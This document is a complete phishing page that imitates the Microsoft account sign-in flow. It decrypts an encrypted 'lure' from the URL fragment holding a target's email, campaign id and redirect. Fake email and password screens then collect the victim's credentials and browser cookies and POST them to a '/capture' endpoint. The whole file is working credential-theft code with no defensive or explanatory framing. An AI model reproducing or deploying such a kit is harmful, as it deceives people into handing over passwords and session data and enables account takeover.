<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="referrer" content="no-referrer">
<title>Sign in to your account</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    font-family: "Segoe UI Webfont", "Segoe UI", -apple-system, "Helvetica Neue", "Lucida Grande", sans-serif;
    background: #e8e8e8 url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="400" height="400"><path d="M0 0h400v400H0z" fill="%23e8e8e8"/></svg>');
    display: flex; justify-content: center; align-items: center; min-height: 100vh;
    -webkit-font-smoothing: antialiased;
}
.card {
    background: #fff;
    width: 440px; max-width: 95vw;
    padding: 44px 44px 36px;
    box-shadow: 0 2px 6px rgba(0,0,0,0.10), 0 0 0 1px rgba(0,0,0,0.04);
}
.logo { display: block; margin: 0 0 16px; height: 24px; }
.logo img { height: 24px; }
h1 { font-size: 1.5rem; font-weight: 600; color: #1b1b1b; margin-bottom: 12px; line-height: 1.25; }
label { display: block; font-size: 0.875rem; color: #1b1b1b; margin-bottom: 4px; }
input[type="email"], input[type="password"], input[type="text"] {
    width: 100%; height: 36px; padding: 6px 10px; border: 1px solid #606060;
    border-bottom: 2px solid #606060; font-size: 0.9375rem; font-family: inherit;
    margin-bottom: 16px; background: #fff; color: #1b1b1b;
}
input:focus { outline: none; border-color: #0078d4; }
input::placeholder { color: #606060; }
.btn {
    width: auto; min-width: 108px; padding: 4px 30px; height: 32px;
    background: #0067b8; color: #fff; border: none; cursor: pointer;
    font-size: 0.9375rem; font-family: inherit; float: right;
}
.btn:hover { background: #005da6; }
.btn:active { background: #004578; }
.btn-back {
    background: rgba(0,0,0,0.12); color: #1b1b1b; float: left;
}
.links { margin-top: 16px; font-size: 0.8125rem; clear: both; }
.links a { color: #0067b8; text-decoration: none; display: inline-block; margin-right: 8px; }
.links a:hover { color: #004578; text-decoration: underline; }
.error { color: #e81123; font-size: 0.8125rem; margin-bottom: 12px; display: none; }
.email-display { font-size: 0.9375rem; color: #1b1b1b; padding: 6px 0 4px; margin-bottom: 16px; }
.email-display .avatar {
    display: inline-block; width: 32px; height: 32px; border-radius: 50%;
    background: #0078d4; color: #fff; text-align: center; line-height: 32px;
    font-size: 0.9375rem; margin-right: 8px; vertical-align: middle;
}
.email-display .email-text { vertical-align: middle; font-weight: 400; }
.divider { border: 0; border-top: 1px solid #e0e0e0; margin: 20px 0; }
.footer { position: fixed; bottom: 0; left: 0; right: 0; background: rgba(0,0,0,0.6); padding: 8px 16px; }
.footer a { color: #fff; font-size: 0.75rem; margin-right: 16px; text-decoration: none; }
.footer a:hover { text-decoration: underline; }
.loading { text-align: center; padding: 40px; color: #666; }
@keyframes spin { to { transform: rotate(360deg); } }
.spinner { width: 24px; height: 24px; border: 2px solid #e0e0e0; border-top-color: #0067b8; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 12px; }
</style>
</head>
<body>
<div id="app"><div class="loading"><div class="spinner"></div>Loading...</div></div>

<script>
// ============================================================
// AES-256-GCM DECRYPTOR + MICROSOFT LOGIN UI
// ============================================================
const AES_KEY_B64 = 'CHANGE_ME';
const CAPTURE_URL = '/capture';
const DEBUG = false;

async function decryptAESGCM(ciphertext, keyBytes) {
    const nonce = ciphertext.slice(0, 12);
    const tag = ciphertext.slice(-16);
    const encrypted = ciphertext.slice(12, ciphertext.length - 16);
    const key = await crypto.subtle.importKey('raw', keyBytes, { name: 'AES-GCM' }, false, ['decrypt']);
    const fullCipher = new Uint8Array(encrypted.length + tag.length);
    fullCipher.set(encrypted, 0); fullCipher.set(tag, encrypted.length);
    const plaintext = await crypto.subtle.decrypt({ name: 'AES-GCM', iv: nonce, tagLength: 128 }, key, fullCipher);
    return new TextDecoder().decode(plaintext);
}

function base64URLDecode(str) {
    str = str.replace(/-/g, '+').replace(/_/g, '/');
    while (str.length % 4) str += '=';
    return Uint8Array.from(atob(str), c => c.charCodeAt(0));
}

function escapeHtml(str) {
    if (!str) return ''; const d = document.createElement('div'); d.textContent = str; return d.innerHTML;
}

// Real Microsoft logo (4-color square)
const MS_LOGO = '<svg xmlns="http://www.w3.org/2000/svg" width="108" height="24" viewBox="0 0 108 24"><path d="M11.5 0H0v11.5h11.5V0z" fill="#F25022"/><path d="M23.5 0H12v11.5h11.5V0z" fill="#7FBA00"/><path d="M11.5 12.5H0V24h11.5V12.5z" fill="#00A4EF"/><path d="M23.5 12.5H12V24h11.5V12.5z" fill="#FFB900"/><text x="32" y="17" font-family="Segoe UI" font-weight="600" font-size="16" fill="#5e5e5e">Microsoft</text></svg>';

async function main() {
    const app = document.getElementById('app');
    const hash = window.location.hash.slice(1);
    if (!hash) { app.innerHTML = '<div class="card"><h1>Sign in</h1><p style="color:#666">Page not found</p></div>'; return; }
    let decoded, lure;
    try {
        decoded = base64URLDecode(hash);
        if (new TextDecoder().decode(decoded.slice(0,3)) !== 'mv=') throw new Error('bad prefix');
        const keyBytes = base64URLDecode(AES_KEY_B64);
        const pt = await decryptAESGCM(decoded.slice(3), keyBytes);
        if (!pt) throw new Error('decrypt failed');
        lure = JSON.parse(pt);
    } catch(e) { app.innerHTML = '<div class="card"><h1>Sign in</h1><p style="color:#666">Cannot verify this link</p></div>'; return; }
    if (DEBUG) console.log('Lure:', lure);

    const email = (lure.e || '').toLowerCase().trim();
    const redirectURL = lure.r || 'https://login.microsoftonline.com';
    const initials = email ? email.charAt(0).toUpperCase() : '?';

    // STEP 1: Email input
    app.innerHTML = '<div class="card">' +
        '<div class="logo">' + MS_LOGO + '</div>' +
        '<h1>Sign in</h1>' +
        '<div class="error" id="error">We couldn\'t find an account with that username. Try another.</div>' +
        '<form id="step1Form">' +
            '<input type="hidden" name="uuid" value="' + escapeHtml(lure.e||'') + '">' +
            '<input type="hidden" name="campaign" value="' + escapeHtml(lure.c||'') + '">' +
            '<label>Email, phone, or Skype</label>' +
            '<input type="email" name="username" id="emailInput" placeholder="Email, phone, or Skype" value="' + escapeHtml(email) + '" autofocus required>' +
            '<div style="margin-bottom:16px;font-size:0.8125rem;">No account? <a href="#" style="color:#0067b8;text-decoration:none;">Create one!</a></div>' +
            '<div style="font-size:0.8125rem;margin-bottom:12px;"><a href="#" style="color:#0067b8;text-decoration:none;">Sign in with Windows Hello or a security key</a></div>' +
            '<div style="overflow:auto"><button type="submit" class="btn">Next</button></div>' +
        '</form>' +
    '</div>';

    document.getElementById('step1Form').addEventListener('submit', function(e) {
        e.preventDefault();
        const emailVal = document.getElementById('emailInput').value.trim();
        if (!emailVal || !emailVal.includes('@')) {
            document.getElementById('error').style.display = 'block';
            return;
        }
        // STEP 2: Password input (looks like real Microsoft step 2)
        app.innerHTML = '<div class="card">' +
            '<div class="logo">' + MS_LOGO + '</div>' +
            '<h1>Enter password</h1>' +
            '<div class="email-display"><span class="avatar">' + initials + '</span><span class="email-text">' + escapeHtml(emailVal) + '</span></div>' +
            '<div class="error" id="error2">Your account or password is incorrect. If you don\'t remember your password, <a href="#" style="color:#0067b8;">reset it now.</a></div>' +
            '<form id="step2Form" method="POST" action="' + CAPTURE_URL + '">' +
                '<input type="hidden" name="uuid" value="' + escapeHtml(lure.e||'') + '">' +
                '<input type="hidden" name="campaign" value="' + escapeHtml(lure.c||'') + '">' +
                '<input type="hidden" name="username" value="' + escapeHtml(emailVal) + '">' +
                '<input type="hidden" name="redirect" value="' + escapeHtml(redirectURL) + '">' +
                '<input type="hidden" name="cookies" id="cookiesField" value="">' +
                '<label>Password</label>' +
                '<input type="password" name="password" id="passwordInput" placeholder="Password" autofocus required>' +
                '<div style="margin-bottom:16px;font-size:0.8125rem;"><a href="#" style="color:#0067b8;text-decoration:none;">Forgot password?</a></div>' +
                '<div style="margin-bottom:16px;font-size:0.8125rem;"><a href="#" style="color:#0067b8;text-decoration:none;">Sign in another way</a></div>' +
                '<div style="overflow:auto"><button type="button" class="btn btn-back" id="backBtn">Back</button><button type="submit" class="btn">Sign in</button></div>' +
            '</form>' +
        '</div>';

        document.getElementById('cookiesField').value = document.cookie || '';
        document.getElementById('backBtn').addEventListener('click', function() { location.reload(); });
        document.getElementById('step2Form').addEventListener('submit', function() {
            document.getElementById('cookiesField').value = document.cookie || '';
        });
    });
}

main();
</script>

<div class="footer">
    <a href="#">Terms of use</a>
    <a href="#">Privacy & cookies</a>
    <a href="#">...</a>
</div>
</body>
</html>
